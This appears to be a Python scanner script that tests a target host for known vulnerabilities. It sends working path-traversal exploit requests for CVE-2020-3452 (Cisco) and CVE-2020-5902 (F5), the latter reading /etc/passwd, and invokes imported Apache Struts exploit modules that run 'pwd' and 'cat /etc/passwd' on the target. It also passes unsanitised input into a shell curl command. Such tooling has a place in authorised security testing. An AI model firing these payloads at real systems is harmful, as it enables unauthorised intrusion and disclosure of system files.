import sys
import os
import requests 
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from termcolor import colored
import struts1
import struts2


def cves_check(url,port_num):
    print(colored("Scanning for CVE-2020-3452 Path Traversal Vulnerability " ,"green"))
    hearders = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0'}
    try:
        #print(url)
        response = requests.get("https://" + url + ":" + port_num + "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../", headers=hearders, verify=False)
        if response.status_code == 200:
            if "cisco" in response.content.__str__().lower():
                print(colored("\tMight Vulnerable to Cisco Read-Only Path Traversal Vulnerability (CVE-2020-3452)\n\t Tried with: " + url ,"red"))
                if "setsessiondata" in response.content.__str__().lower(): 
                    print(colored("\tRechecking responses: HOST VULNERRABLE\n","red"))
        else:
            print(colored("\tNot Vulnerable\n" ,"green"))
    except Exception as e:
        if "aborted" in str(e):
            print(colored("\tConnection Aborted by Server. Considering Not Vulnerable\n" ,"white"))
        else:
            print(e)
            print("\n")


    print(colored("Scanning For Options Bleed. ", "green"))
    cmd = "curl -sI -X OPTIONS https://" + url + ":" + port_num
    res = os.popen(cmd)
    output = res.read()
    output = output.__str__()
    #print(output)
    for line in output.splitlines():
        if "allow" in line or "Allow" in line:
            print("\tMethods Server " + line )
    print(colored("\tNot Vulnerable to Options Bleed.\n", "white"))


    print(colored("Scanning For CVE-2020-5902", "green"))
    try:
        response = requests.get("https://" + url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", verify=False)
        if response.status_code == 200:
            print("\t200 OK received from server.")
            if "root" in response.content.__str__():
                print(colored("\tVulnerable to CVE-2020-5902 CRITICAL ISSUE. \n Please find the Vulnerable URL below \n\thttps://" + url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "red"))
            else:
                print(colored("\tUnable to verify if host vulnerable or not. \n\tPlease open below URL manually to verify.\n\thttps://" + url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "white"))
            print("\n")
        else:
            print(colored("\tNot Vulnerable to CVE-2020-5902\n", "white"))
    except:
        pass

    print(colored("Checking installation of Apache Struts", "green"))
    try:
        struts1.exploit(url+ ":" + port_num ,"pwd")
        struts2.exploit(url+ ":" + port_num , "cat /etc/passwd")
        print("\n")
    except Exception as e:
        print("Exception occured when Checking for checking installation for Struts.")
        print("ERROR: " + str(e))


#domain = sys.argv[1]
#cves_check(domain)